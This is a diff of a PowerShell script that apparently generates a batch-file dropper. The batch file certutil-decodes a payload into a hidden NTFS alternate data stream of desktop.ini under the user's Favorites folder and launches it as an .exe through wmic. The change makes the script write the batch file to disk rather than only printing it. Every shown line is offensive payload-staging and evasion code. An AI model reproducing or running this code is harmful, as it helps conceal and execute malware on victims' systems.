@@ -44,8 +44,9 @@ $pnt++;
 
 $result += "certutil -decode %userprofile%\Favorites\desktop.ini:$($random) %userprofile%\Favorites\desktop.ini:$($random).exe"
 $result += "`r`n"
-#$result += "type %userprofile%\$($random).exe > %userprofile%\Favorites\desktop.ini:$($random).exe"
-#$result += "`r`n"
+$result += "echo `"`" >> %userprofile%\Favorites\desktop.ini"
+$result += "`r`n"
 $result += "wmic process call create `"%userprofile%\Favorites\desktop.ini:$($random).exe`""
-Write-Host $result
-#$result | Out-File "$($random).bat"
+#Write-Host $result
+$result | Out-File -Encoding utf8 "$($random).bat"
+write-host "Created file $random.bat"
